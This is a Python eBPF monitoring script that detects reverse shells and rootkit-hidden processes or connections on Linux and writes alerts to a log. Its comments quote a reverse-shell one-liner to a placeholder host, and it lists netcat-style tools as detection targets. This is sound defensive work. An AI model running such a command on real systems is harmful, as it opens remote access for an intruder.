#!/usr/bin/python3
from bcc import BPF
import os, time, socket, struct
from datetime import datetime

# --- LOGGING SETUP ---
LOG_FILE = "/var/log/sentinel/alerts.log"
os.makedirs("/var/log/sentinel", exist_ok=True)

def log_alert(alert_type, message):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_line = f"{timestamp} | NETWORK | {alert_type} | {message}"
    with open(LOG_FILE, 'a') as f:
        f.write(log_line + "\n")
    print(log_line)

# --- eBPF PROGRAM ---
ebpf_code = """
#include <uapi/linux/ptrace.h>
#include <net/sock.h>
#include <bcc/proto.h>

struct conn_t {
    u32 pid;
    char comm[16];
    u32 saddr;
    u32 daddr;
    u16 sport;
    u16 dport;
};

BPF_HASH(connections, u64, struct conn_t);

int trace_tcp_state(struct pt_regs *ctx, struct sock *sk, int state) {
    u64 key = bpf_get_current_pid_tgid();
    u32 pid = key >> 32;
    struct conn_t conn = {};
    u16 family = 0;

    bpf_probe_read(&family, sizeof(family), &sk->__sk_common.skc_family);
    if (family != 2) return 0;  // IPv4 only

    conn.pid = pid;
    bpf_get_current_comm(&conn.comm, sizeof(conn.comm));
    bpf_probe_read(&conn.saddr, sizeof(conn.saddr), &sk->__sk_common.skc_rcv_saddr);
    bpf_probe_read(&conn.daddr, sizeof(conn.daddr), &sk->__sk_common.skc_daddr);
    bpf_probe_read(&conn.sport, sizeof(conn.sport), &sk->__sk_common.skc_num);
    bpf_probe_read(&conn.dport, sizeof(conn.dport), &sk->__sk_common.skc_dport);

    // Capture SYN_SENT(2), ESTABLISHED(1), LISTEN(10)
    if (state == 1 || state == 2 || state == 10) {
        connections.update(&key, &conn);
    }
    // Cleanup on CLOSE_WAIT(8) or FIN_WAIT(7)
    if (state == 7 || state == 8) {
        connections.delete(&key);
    }
    return 0;
}

int trace_tcp_close(struct pt_regs *ctx, struct sock *sk) {
    u64 key = bpf_get_current_pid_tgid();
    connections.delete(&key);
    return 0;
}
"""

# --- CONFIGURATION ---
DASHBOARD_IP = "192.168.1.73"

IGNORE_PROCESSES = {
    "ksoftirqd", "swapper", "kworker", "kthreadd", "rcu_sched",
    "migration", "watchdog", "systemd", "sshd", "kdevtmpfs",
    "netns", "khelper", "kaluad", "jbd2", "ext4", "loop", "rpciod"
}

# Processes that are suspicious ONLY when their stdio is redirected to a socket
SHELL_PROCS = {
    "bash", "sh", "dash", "python", "python3",
    "perl", "ruby", "php", "nc", "ncat", "netcat", "socat"
}

alerted_connections = set()

# --- HELPERS ---

def ip_str(packed):
    try:
        return socket.inet_ntoa(struct.pack("<I", packed))
    except Exception:
        return "0.0.0.0"

def get_proc_connections():
    """
    Read active connections visible in userspace via /proc/net/tcp.
    A rootkit hiding connections will manipulate this file.
    """
    conns = set()
    try:
        with open("/proc/net/tcp") as f:
            for line in f.readlines()[1:]:
                parts = line.strip().split()
                if len(parts) < 4:
                    continue
                rem = parts[2].split(":")
                rem_ip = socket.inet_ntoa(struct.pack("<I", int(rem[0], 16)))
                rem_port = int(rem[1], 16)
                conns.add(f"{rem_ip}:{rem_port}")
    except Exception:
        pass
    return conns

def is_ignored_process(comm):
    comm_lower = comm.lower()
    for ignore in IGNORE_PROCESSES:
        if ignore in comm_lower:
            return True
    return False

def is_dashboard_connection(dst_ip, dport):
    return dst_ip == DASHBOARD_IP or dport == 5000

def is_stdio_socket(pid):
    """
    Check if stdin(0), stdout(1), stderr(2) are redirected to a socket.

    Real reverse shell:
        bash -i >& /dev/tcp/x.x.x.x/4444 0>&1
        → /proc/<pid>/fd/0,1,2 all point to  socket:[inode]  ← FLAGGED

    Plain connection:
        nc 192.168.1.65 4444
        → /proc/<pid>/fd/0,1,2 point to /dev/pts/X (terminal) ← NOT flagged

    Returns True only if at least 2 of 3 stdio fds point to a socket.
    """
    socket_fds = 0
    try:
        for fd in [0, 1, 2]:
            try:
                link = os.readlink(f"/proc/{pid}/fd/{fd}")
                if link.startswith("socket:"):
                    socket_fds += 1
            except Exception:
                pass
    except Exception:
        pass
    return socket_fds >= 2

# --- CORE AUDIT ---

def run_audit(b):
    global alerted_connections

    visible_pids = set(int(d) for d in os.listdir("/proc") if d.isdigit())
    proc_conns   = get_proc_connections()
    kernel_map   = b["connections"]

    for key, conn in kernel_map.items():
        pid   = conn.pid
        comm  = conn.comm.decode("utf-8", errors="replace").strip()
        dst   = ip_str(conn.daddr)
        dport = socket.ntohs(conn.dport)

        if dport == 0:
            continue
        if is_ignored_process(comm):
            continue
        if is_dashboard_connection(dst, dport):
            continue

        alert_key = f"{pid}:{comm}:{dst}:{dport}"
        if alert_key in alerted_connections:
            continue

        pid_hidden  = pid not in visible_pids
        conn_str    = f"{dst}:{dport}"
        conn_hidden = conn_str not in proc_conns

        # --- REVERSE SHELL DETECTION ---
        # Condition: process is a shell/interpreter AND its stdio fds point to a socket.
        # This separates `bash -i >& /dev/tcp/...` (flagged)
        # from plain `nc host port`               (not flagged)
        if comm in SHELL_PROCS and is_stdio_socket(pid):
            log_alert("REVERSE_SHELL",
                      f"PID={pid}|PROC={comm}|DEST={dst}:{dport}|"
                      f"REASON=stdio_redirected_to_socket")
            alerted_connections.add(alert_key)
            continue

        # --- HIDDEN PROCESS WITH NETWORK ACTIVITY ---
        # eBPF sees the PID but /proc listing does not (kernel rootkit hiding it)
        if pid_hidden and dport > 1024:
            log_alert("HIDDEN_PROCESS_NETWORK",
                      f"PID={pid}|PROC={comm}|DEST={dst}:{dport}|"
                      f"REASON=pid_missing_from_proc")
            alerted_connections.add(alert_key)
            continue

        # --- HIDDEN CONNECTION ---
        # eBPF sees the connection but /proc/net/tcp does not (rootkit hiding it)
        if conn_hidden:
            log_alert("HIDDEN_CONNECTION",
                      f"PID={pid}|PROC={comm}|DEST={dst}:{dport}|"
                      f"REASON=conn_missing_from_proc_net_tcp")
            alerted_connections.add(alert_key)
            continue

    # NOTE: Do NOT call kernel_map.clear()
    # eBPF manages its own cleanup via trace_tcp_close and tcp_set_state hooks.
    if len(alerted_connections) > 500:
        alerted_connections.clear()

# --- ENTRY POINT ---

print("[*] SENTINEL Network Detector Started")
print(f"[*] Logging  → {LOG_FILE}")
print("[*] Detecting → REVERSE_SHELL | HIDDEN_PROCESS_NETWORK | HIDDEN_CONNECTION")
print("[*] Method    → eBPF kprobe on tcp_set_state + /proc/fd stdio socket check\n")

b = BPF(text=ebpf_code)
b.attach_kprobe(event="tcp_set_state", fn_name="trace_tcp_state")
b.attach_kprobe(event="tcp_close",     fn_name="trace_tcp_close")

print("[*] kprobes attached: tcp_set_state, tcp_close")
print("[*] Audit interval: 3 seconds\n")

try:
    while True:
        run_audit(b)
        time.sleep(3)
except KeyboardInterrupt:
    print("\n[!] Stopping SENTINEL...")
